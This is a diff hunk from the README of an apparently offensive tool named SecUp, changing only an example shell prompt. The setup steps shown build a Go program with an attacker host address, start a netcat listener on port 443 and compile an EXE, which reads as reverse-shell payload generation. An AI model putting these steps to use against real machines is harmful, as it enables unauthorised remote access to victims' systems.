@@ -16,7 +16,7 @@ Setup is simple.<br>
 2. Build `SecUp.go`<br>
 `go build SecUp.go`
 3. From terminal, run: ./SecUp <LHOST><br>
-`dlowrie@kali:~/Tools/update_script$ ./SecUp 192.168.1.200`
+`kali@kali:~/update_script$ ./SecUp 192.168.1.200`
 4. Open another terminal, and start a Listener on port 443 (sudo if not root)<br>
 `sudo nc -vnlp 443`
 5. Compile EXE<br>
